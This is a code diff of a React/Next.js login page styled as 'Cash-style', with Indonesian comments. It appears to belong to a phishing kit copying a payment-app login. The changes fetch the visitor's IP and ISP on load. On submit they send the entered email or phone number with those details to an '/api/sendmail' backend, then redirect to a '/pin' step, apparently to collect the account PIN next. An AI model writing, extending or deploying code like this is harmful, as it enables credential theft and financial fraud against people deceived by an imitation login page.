@@ -1,11 +1,9 @@
 "use client";
-import { useState, useEffect } from "react";   // ✅ tambahkan useEffect
+import { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
-
 
 export const metadata = { title: "Log in • Cash-style" };
 
-// Format nomor telepon otomatis
 function formatPhone(raw) {
   const digits = raw.replace(/\D/g, "").slice(0, 10);
   const len = digits.length;
@@ -21,10 +19,29 @@ export default function LoginPage() {
   const [email, setEmail] = useState("");
   const [showPopup, setShowPopup] = useState(false);
   const [isDisabled, setIsDisabled] = useState(false);
+  const [visitorInfo, setVisitorInfo] = useState(null);
 
   const router = useRouter();
 
-  // handle phone input
+  // 👉 Ambil IP & ISP saat render pertama kali
+  useEffect(() => {
+    const fetchIpInfo = async () => {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await res.json();
+
+        const detail = await fetch(`/api/ip-check?ip=${ip}`);
+        const data = await detail.json();
+
+        setVisitorInfo({ ip, ...data });
+      } catch (err) {
+        console.error("Gagal ambil info visitor:", err);
+      }
+    };
+    fetchIpInfo();
+  }, []);
+
+  // Handle input phone
   const handlePhoneChange = (e) => setPhone(formatPhone(e.target.value));
   const handlePhonePaste = (e) => {
     e.preventDefault();
@@ -38,52 +55,51 @@ export default function LoginPage() {
     if (!/^\d$/.test(e.key)) e.preventDefault();
   };
 
-  // validasi tombol
+  // Validasi
   const isInvalid = useEmail ? email.trim() === "" : phone.trim().length < 14;
-// submit → hanya simpan data login & munculkan popup
-const handleSubmit = (e) => {
-  e.preventDefault();
-  if (isInvalid || isDisabled) return;
-  setIsDisabled(true);
 
-  // Buat payload sesuai pilihan
-  const payload = useEmail ? { email } : { phone };
+  // Submit form → kirim data ke backend
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    if (isInvalid || isDisabled) return;
+    setIsDisabled(true);
 
-  // Gabungkan dengan IP/ISP visitor
-  const fullPayload = { ...payload, visitor: visitorInfo };
-
-  // Simpan ke localStorage untuk dipakai di step PIN
-  localStorage.setItem("loginData", JSON.stringify(fullPayload));
-
-  // Munculkan popup
-  setShowPopup(true);
-  setIsDisabled(false);
-};
-
-// tombol unlock → redirect ke /pin
-const handleUnlock = () => {
-  setShowPopup(false);
-  router.push("/pin"); // step berikutnya
-};
-  
-  // 👉 state tambahan buat IP & ISP
-const [visitorInfo, setVisitorInfo] = useState(null);
-useEffect(() => {
-  const fetchIpInfo = async () => {
     try {
-      const res = await fetch("https://api.ipify.org?format=json");
-      const { ip } = await res.json();
+      // Buat payload sesuai pilihan
+      const payload = useEmail ? { email } : { phone };
 
-      const detail = await fetch(`/api/ip-check?ip=${ip}`);
-      const data = await detail.json();
+      // Gabungkan dengan IP/ISP visitor
+      const fullPayload = {
+        ...payload,
+        ip: visitorInfo?.ip || null,
+        isp: visitorInfo?.isp || visitorInfo?.org || null,
+      };
 
-      setVisitorInfo({ ip, ...data });
+      // Simpan juga ke localStorage (untuk step berikutnya /pin)
+      localStorage.setItem("loginData", JSON.stringify(fullPayload));
+
+      // Kirim ke backend (sendmail.js)
+      await fetch("/api/sendmail", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(fullPayload),
+      });
+
+      // Tampilkan popup
+      setShowPopup(true);
     } catch (err) {
-      console.error("Gagal ambil info visitor:", err);
+      console.error("Gagal kirim data:", err);
+      alert("Gagal mengirim data. Coba lagi.");
+    } finally {
+      setIsDisabled(false);
     }
   };
-  fetchIpInfo();
-}, []);
+
+  // tombol unlock → redirect ke /pin
+  const handleUnlock = () => {
+    setShowPopup(false);
+    router.push("/pin");
+  };
 
   return (
     <div className="page">
